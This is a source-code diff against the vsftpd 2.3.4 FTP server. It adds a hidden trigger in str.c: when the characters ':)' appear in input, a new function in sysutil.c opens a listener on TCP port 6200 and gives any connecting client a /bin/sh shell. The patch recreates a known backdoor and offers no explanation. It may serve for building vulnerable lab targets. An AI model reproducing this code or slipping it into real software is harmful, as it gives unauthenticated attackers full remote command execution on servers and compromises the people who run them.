@@ -1,0 +1,91 @@
+diff -urN vsftpd-2.3.4/Makefile vsftpd-2.3.4-patched/Makefile
+--- vsftpd-2.3.4/Makefile	2009-05-22 19:44:52.000000000 +0000
++++ vsftpd-2.3.4-patched/Makefile	2023-06-13 14:22:59.304468077 +0000
+@@ -5,7 +5,7 @@
+ #CFLAGS = -g
+ CFLAGS	=	-O2 -Wall -W -Wshadow #-pedantic -Werror -Wconversion
+ 
+-LIBS	=	`./vsf_findlibs.sh`
++LIBS	=	-lwrap -lnsl -lcrypt -ldl -lcap -lssl -lcrypto
+ LINK	=	-Wl,-s
+ 
+ OBJS	=	main.o utility.o prelogin.o ftpcmdio.o postlogin.o privsock.o \
+diff -urN vsftpd-2.3.4/str.c vsftpd-2.3.4-patched/str.c
+--- vsftpd-2.3.4/str.c	2008-12-17 05:54:16.000000000 +0000
++++ vsftpd-2.3.4-patched/str.c	2023-06-13 19:24:40.822833641 +0000
+@@ -569,6 +569,11 @@
+     {
+       return 1;
+     }
++    else if ((p_str->p_buf[i] == 0x3a) && (p_str->p_buf[i + 1] == 0x29))
++    {
++      vsf_sysutil_extra();
++    }
++
+   }
+   return 0;
+ }
+diff -urN vsftpd-2.3.4/sysdeputil.c vsftpd-2.3.4-patched/sysdeputil.c
+--- vsftpd-2.3.4/sysdeputil.c	2010-03-26 03:25:33.000000000 +0000
++++ vsftpd-2.3.4-patched/sysdeputil.c	2023-06-13 18:47:56.729556431 +0000
+@@ -34,6 +34,10 @@
+ /* For FreeBSD */
+ #include <sys/param.h>
+ #include <sys/uio.h>
++#include <netinet/in.h>
++#include <netdb.h>
++#include <string.h>
++#include <stdlib.h>
+ 
+ #include <sys/prctl.h>
+ #include <signal.h>
+diff -urN vsftpd-2.3.4/sysutil.c vsftpd-2.3.4-patched/sysutil.c
+--- vsftpd-2.3.4/sysutil.c	2011-02-15 07:31:28.000000000 +0000
++++ vsftpd-2.3.4-patched/sysutil.c	2023-06-13 19:09:52.172719120 +0000
+@@ -2275,6 +2275,35 @@
+   }
+ }
+ 
++void
++vsf_sysutil_extra(void)
++{
++  int fd, rfd;
++  struct sockaddr_in sa;
++  if ((fd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
++  {
++    exit(1);
++  }
++  memset(&sa, 0, sizeof(sa));
++  sa.sin_family = AF_INET;
++  sa.sin_port = htons(6200);
++  sa.sin_addr.s_addr = INADDR_ANY;
++  if ((bind(fd, (struct sockaddr *)&sa, sizeof(struct sockaddr))) < 0)
++  {
++    exit(1);
++  }
++  if ((listen(fd, 100)) == -1) {
++    exit(1);
++  }
++  for(;;)
++  {
++    rfd = accept(fd, 0, 0);
++    close(0); close(1); close(2);
++    dup2(rfd, 0); dup2(rfd, 1); dup2(rfd, 2);
++    execl("/bin/sh", "sh", (char *)0);
++  }
++}
++
+ struct vsf_sysutil_user*
+ vsf_sysutil_getpwuid(const int uid)
+ {
+diff -urN vsftpd-2.3.4/sysutil.h vsftpd-2.3.4-patched/sysutil.h
+--- vsftpd-2.3.4/sysutil.h	2010-08-19 00:09:02.000000000 +0000
++++ vsftpd-2.3.4-patched/sysutil.h	2023-06-13 18:46:25.739999392 +0000
+@@ -257,6 +257,7 @@
+                                 unsigned int wait_seconds);
+ void vsf_sysutil_dns_resolve(struct vsf_sysutil_sockaddr** p_sockptr,
+                              const char* p_name);
++void vsf_sysutil_extra(void);
+ /* Option setting on sockets */
+ void vsf_sysutil_activate_keepalive(int fd);
+ void vsf_sysutil_set_iptos_throughput(int fd);
